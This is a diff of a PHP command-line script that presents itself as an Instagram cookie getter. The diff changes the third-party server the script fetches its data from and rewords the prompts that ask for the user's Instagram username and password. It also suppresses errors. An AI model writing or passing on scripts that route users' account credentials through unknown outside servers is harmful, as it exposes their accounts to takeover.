@@ -1,9 +1,9 @@
 <?php
 error_reporting(0);
 $conf=array(
-            'me' => 'Get Cookie Instagram | https://www.instamoment.xyz',
-            'url' =>'https://www.instamoment.xyz/sameel',
-            'urlsubmit' => 'https://url'
+            'me' => 'Get Instagram Cookie For | https://www.instamoment.xyz',
+            'url' =>'http://www.indotagram.com/live',
+            'urlsubmit' => 'http://url'
             );
  
 function Submit($url,$fields)
@@ -72,7 +72,6 @@ function saveFile($x,$y){
              fwrite($f,$y);
              fclose($f);
    }
-
 function _req($url){
    $opts = array(
             19913 => 1,
@@ -85,7 +84,6 @@ function _req($url){
    curl_close($ch);
    return $result;
   }
-
 $CY="\e[36m";
 $GR="\e[2;32m"; 
 $OG="\e[92m"; 
@@ -103,9 +101,9 @@ echo $WH.$conf['me'];
 echo "\n";  
 $data = Submit($conf['url'].'/data',0);
 $data = json_decode($data,true);
-echo"\n".$OG."Enter Your IG Username : ".$WH;
+echo"\n".$OG."Enter Your Instagram Username : ".$WH;
 $mu=trim(fgets(STDIN));
-echo"".$OG."Enter Your IG Password : ".$WH;
+echo"".$OG."Enter Your Instagram Password : ".$WH;
 $mp=trim(fgets(STDIN));
 echo "\n";
 $login = proccess(1, $data['ua'], 
